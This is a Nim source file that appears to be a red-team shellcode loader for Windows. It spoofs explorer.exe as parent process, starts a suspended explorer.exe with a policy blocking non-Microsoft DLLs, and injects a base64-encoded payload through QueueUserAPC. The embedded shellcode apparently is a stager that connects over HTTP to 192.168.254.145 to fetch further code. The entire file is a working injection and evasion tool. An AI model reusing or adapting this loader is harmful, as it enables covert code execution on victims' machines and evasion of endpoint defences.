import base64
import endians

import winim
import winim/lean
import strformat

# Review
# https://github.com/pwndizzle/c-sharp-memory-injection/blob/master/apc-injection-new-process.cs

proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc GetProcessByName(process_name: string): DWORD =
    var
        pid: DWORD = 0
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == process_name:
                pid = entry.th32ProcessID
                break

    return pid

proc newApcQueue[byte](shellcode: openArray[byte]): void =
  var
      si: STARTUPINFOEX
      pi: PROCESS_INFORMATION
      ps: SECURITY_ATTRIBUTES
      ts: SECURITY_ATTRIBUTES
      policy: DWORD64
      lpSize: SIZE_T
      res: WINBOOL
      pHandle: HANDLE
      tHandle: HANDLE

  si.StartupInfo.cb = sizeof(si).cint
  ps.nLength = sizeof(ps).cint
  ts.nLength = sizeof(ts).cint
 
  InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)

  si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))

  InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)

  policy = 0x100000000000; # PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
  res = UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, addr policy, sizeof(policy), NULL, NULL); 
  
  si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT

  DeleteProcThreadAttributeList(si.lpAttributeList)

  var status = 0
  var processId = GetProcessByName("explorer.exe")
  var cid: CLIENT_ID
  var parentHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId)
  cid.UniqueProcess = processID
  var oldprotect: DWORD = 0;

  res = UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, addr parentHandle, sizeof(parentHandle), NULL, NULL)

  res = CreateProcess(
      NULL,
      newWideCString(r"explorer.exe"),
      ps,
      ts, 
      TRUE,
      CREATE_SUSPENDED or DETACHED_PROCESS or CREATE_NO_WINDOW or EXTENDED_STARTUPINFO_PRESENT,
      NULL,
      NULL,
      addr si.StartupInfo,
      addr pi
  )

  pHandle = pi.hProcess
  tHandle = pi.hThread

  let rPtr = VirtualAllocEx(pHandle, nil, cast[DWORD](shellcode.len), MEM_COMMIT, PAGE_READWRITE)

  var bytesWritten: SIZE_T

  WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
  VirtualProtectEx(pHandle, rPtr, len(shellcode), PAGE_EXECUTE_READ, &oldprotect)
  QueueUserAPC(cast[PAPCFUNC](rPtr), tHandle, cast[ULONG_PTR](nil))
  ResumeThread(tHandle)

  CloseHandle(tHandle)
  CloseHandle(pHandle)
  
  
when isMainModule:
  func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))
 
  let enc = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9XpkwAAAFpIicFBuLsBAABNMclBUUFRagNBUUG6V4mfxv/V63lbSInBSDHSSYnYTTHJUmgAMsCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifG6HwAAAGoAaIAzAABJieBBuQQAAABBunVGnob/1UiJ8UiJ2knHwP////9NMclSUkG6LQYYe//VhcAPhZ0BAABI/88PhIwBAADrs+nkAQAA6IL///8vdlBMSwA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlAFVzZXItQWdlbnQ6IE1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IC5ORVQgQ0xSIDIuMC41MDcyNzsgLk5FVCBDTFIgMy4wLjA0NTA2LjMwKQ0KADVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoANU8hUCVAQVBbNFxQWlg1NChQXik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKgA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSQBBvvC1olb/1UgxyboAAEAAQbgAEAAAQblAAAAAQbpYpFPl/9VIk1NTSInnSInxSInaQbgAIAAASYn5QboSloni/9VIg8QghcB0tmaLB0gBw4XAdddYWFhIBQAAAABQw+h//f//MTkyLjE2OC4yNTQuMTQ1AAAAAAA=" 

  let shellcode = toByteSeq(decode(enc))
  newApcQueue(shellcode)
